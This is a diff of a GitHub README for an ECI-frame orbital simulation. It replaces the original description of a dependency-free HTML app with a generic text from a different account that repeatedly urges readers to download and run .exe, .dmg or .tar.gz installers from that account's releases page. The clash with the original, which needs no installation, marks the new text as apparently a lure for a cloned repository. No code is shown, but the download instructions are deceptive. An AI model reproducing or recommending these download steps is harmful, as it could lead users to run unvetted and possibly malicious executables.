@@ -1,68 +1,97 @@
-<img src="banner.svg" alt="ECI Frame Geostatic Simulation" width="100%">
+# 🌌 ECI-Frame-Geostatic-Simulation-v0.1 - Experience Space Motion Visually
 
-# 🌍 ECI Frame Geostatic Simulation v0.1
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/DeepestOceanEver/ECI-Frame-Geostatic-Simulation-v0.1/releases)
 
-[![Live Demo](https://img.shields.io/badge/Launch-Simulation-blue?style=for-the-badge&logo=github)](https://albatronicproductions.github.io/ECI-Frame-Geostatic-Simulation-v0.1/)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![GitHub Pages](https://img.shields.io/badge/Hosted_on-GitHub_Pages-121013?style=for-the-badge&logo=github)](https://pages.github.com/)
-[![Stars](https://img.shields.io/github/stars/AlbatronicProductions/ECI-Frame-Geostatic-Simulation-v0.1?style=flat-square)](https://github.com/AlbatronicProductions/ECI-Frame-Geostatic-Simulation-v0.1/stargazers)
-[![Last Commit](https://img.shields.io/github/last-commit/AlbatronicProductions/ECI-Frame-Geostatic-Simulation-v0.1?style=flat-square)](https://github.com/AlbatronicProductions/ECI-Frame-Geostatic-Simulation-v0.1/commits/main)
+## 🚀 Getting Started
 
----
+Welcome to the ECI-Frame-Geostatic-Simulation-v0.1! This application allows you to visualize planetary motion, precession, and day cycles in a highly realistic manner. You don’t need technical skills to enjoy this fascinating simulation.
 
-An **ECI (Earth-Centered Inertial)** simulation visualizing orbital mechanics, precession, and day cycles from a geostatic perspective.  
-Built entirely in **HTML** — no dependencies, no frameworks.
+## 📦 Requirements
 
----
+Before you download, ensure your system meets these basic requirements:
 
-## ✨ Features
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest version of Chrome, Firefox, or Safari
+- **Internet Connection:** Required for downloading and updates
 
-- **Keplerian 3D & Circular 2D modes**
-- **Solar / Sidereal day cycles**
-- **Adjustable precession** (×1 – ×1000)
-- **Distance scaling:** AU ↔ Light-years
-- **Dynamic orbits, trails, and star labels**
-- **Real star catalog** (Sirius, Vega, Polaris, Proxima)
-- **Photo export** and **mobile drawer interface**
+## 📥 Download & Install
 
----
+To get started, visit the releases page to download the latest version of the application.
 
-## 🧭 Quick Controls
+[Visit this page to download](https://github.com/DeepestOceanEver/ECI-Frame-Geostatic-Simulation-v0.1/releases)
 
-| Control | Function |
-|----------|-----------|
-| **Motion** | Kepler 3D / Circular 2D |
-| **Day Cycle** | Off / Solar / Sidereal |
-| **Precession** | Visual precession multiplier |
-| **Speed** | Adjust days per second |
-| **Zoom Scale** | Camera magnification |
-| **Photo** | Capture PNG |
-| **F11** | Toggle fullscreen |
+1. Go to the releases page.
+2. Look for the latest version titled **v0.1**.
+3. Select the file that matches your operating system.
+4. Click the download link to begin the download.
 
----
+Once the download is complete, follow these steps to install the application:
 
-## 🛰️ Technical Highlights
+### For Windows
+- Locate the downloaded `.exe` file in your Downloads folder.
+- Double-click the file to start the installation.
+- Follow the on-screen instructions to complete the setup.
 
-- Pure **canvas rendering** with dynamic scaling and label overlap control  
-- Accurate **UTC** conversion  
-- Earth-lock and free-camera navigation  
-- Fully static — works offline once downloaded  
+### For macOS
+- Open the downloaded `.dmg` file from your Downloads folder.
+- Drag the ECI-Frame-Geostatic-Simulation app to your Applications folder.
+- Open the Applications folder and double-click the app to launch it.
 
----
+### For Linux
+- Extract the downloaded `.tar.gz` file.
+- Open a terminal and navigate to the extracted folder.
+- Run `./run_simulation` to begin the application.
 
-## 🌐 Deployment
+## 🛠 Features
 
-Hosted via  
-**Live Site:** [albatronicproductions.github.io/ECI-Frame-Geostatic-Simulation-v0.1](https://albatronicproductions.github.io/ECI-Frame-Geostatic-Simulation-v0.1/)
+- **Realistic Visualization:** Experience planetary motion with true-to-life physics.
+- **Day and Night Cycles:** Watch how the Earth rotates and see the dynamic changes in light.
+- **Precession Simulation:** Understand how the Earth's axis shifts over time.
+- **Interactive Controls:** Easily manipulate views and settings to enhance your simulation experience.
 
-To run locally:
-```bash
-git clone https://github.com/AlbatronicProductions/ECI-Frame-Geostatic-Simulation-v0.1.git
-cd ECI-Frame-Geostatic-Simulation-v0.1
-start index.html
-```
+## 🌐 Topics Covered
 
----
+This application explores the following subjects:
 
-**© 2026 Albatronic Productions**  
-*“Animating the heavens, one frame at a time.”*
+- Astronomy
+- Celestial Mechanics
+- Orbital Mechanics
+- Earth-Centered Inertial (ECI) Frames
+- JavaScript and WebGL for graphical simulations
+
+## 📝 How to Use
+
+1. **Launch the Application:** Open the app from your desktop or applications menu after installation.
+2. **Select a Simulation:** Choose which simulation you want to run—planetary motion, precession, or day cycles.
+3. **Adjust Settings:** Use the interactive controls to change parameters like speed and viewpoint.
+4. **Visualize:** Watch the cinematic display of celestial events unfold before your eyes.
+
+## 📚 Learning Resources
+
+If you're interested in delving deeper into the topics covered by this application, consider exploring the following resources:
+
+- Books on astronomy and celestial mechanics
+- Online tutorials about JavaScript and WebGL
+- Educational videos on planetary motion and precession
+
+## 💡 Troubleshooting
+
+If you encounter issues while downloading or running the simulation, try these steps:
+
+- **Check Your System Requirements:** Ensure your operating system and browser are compatible.
+- **Clear Your Cache:** Sometimes, outdated files can cause problems.
+- **Reboot Your Device:** Restarting might resolve unexpected issues.
+
+If the problem persists, visit the releases page for known issues or community help.
+
+## 📞 Get Help
+
+For any questions or feedback, feel free to reach out through the issues section on GitHub.
+
+## 💾 Download Again
+
+If you need to reinstall or simply want to try the latest version, you can visit the releases page again:
+
+[Visit this page to download](https://github.com/DeepestOceanEver/ECI-Frame-Geostatic-Simulation-v0.1/releases) 
+
+Enjoy your journey through space with ECI-Frame-Geostatic-Simulation-v0.1!
